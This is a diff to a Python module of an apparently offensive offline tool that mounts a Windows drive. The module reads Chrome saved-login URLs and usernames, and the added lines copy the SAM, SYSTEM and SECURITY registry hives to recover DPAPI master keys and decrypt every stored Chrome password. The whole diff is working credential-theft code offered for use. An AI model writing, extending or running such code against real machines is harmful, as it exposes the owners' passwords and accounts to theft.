@@ -3,6 +3,7 @@ import shutil
 import os
 import time
 import sqlite3
+import tofu_lib.dpapi
 def __main__(drive_name,drive_format):
 	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
 		print("[-] This module does not work with a Bitlocker drive")
@@ -51,15 +52,39 @@ def __main__(drive_name,drive_format):
 						cursor2 = conn2.cursor()
 						cursor2.execute("SELECT action_url,username_value FROM logins")
 						allData = cursor2.fetchall()
+						#print(allData)
 						for data in allData:
 
 							if len(data[0]) > 0 or len(data[1]) > 0:
+								#print(data[0])
 								history_file.write(f"URL : {data[0]}\n")
 								history_file.write(f"Username : {data[1]}\n")
 								print(f"[!!!] URL : {data[0]}")
 								print(f"[!!!] Username : {repr(data[1])}")
-							
 						conn2.close()
+						time.sleep(1)
+						print("[+ CLOSED DATABASE FILE +]")
+						print("\n[=== GETTING PASSWORDS ===]\n")
+						shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
+						shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
+						shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SECURITY","tofu_tmp/HASHDUMP_SECURITY")
+						masterkeys = tofu_lib.dpapi.get_masterkeys("tofu_tmp/windows_filesystem", "tofu_tmp/HASHDUMP_SAM", "tofu_tmp/HASHDUMP_SYSTEM", "tofu_tmp/HASHDUMP_SECURITY")
+						if masterkeys.masterkeys:
+							print("[+] We have masterkeys!")
+							for masterkey in masterkeys.masterkeys:
+								print(f"-- MASTERKEY / {masterkey}")
+								
+							paths = masterkeys.find_chrome_database_file_offline("tofu_tmp/windows_filesystem/Users/")
+							passwords = masterkeys.decrypt_all_chrome(paths)
+							for i in passwords:
+								for passw in i:
+									print(passw)
+									history_file.write(str(passw))	
+								print("\n")
+						else:
+							print("[-] We don't have any masterkeys; This could be because all the users on the machine are domain users")
+						
+							
 					except Exception as sqlite_error:
 						print(f"[-] Unknown error : {sqlite_error}")
 						conn.close()
@@ -70,5 +95,8 @@ def __main__(drive_name,drive_format):
 					
 		except Exception as open_error:
 			print(f"[-] Error {open_error}")
+		os.remove("tofu_tmp/HASHDUMP_SYSTEM")
+		os.remove("tofu_tmp/HASHDUMP_SECURITY")
+		os.remove("tofu_tmp/HASHDUMP_SAM")
 		time.sleep(2)	
 		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
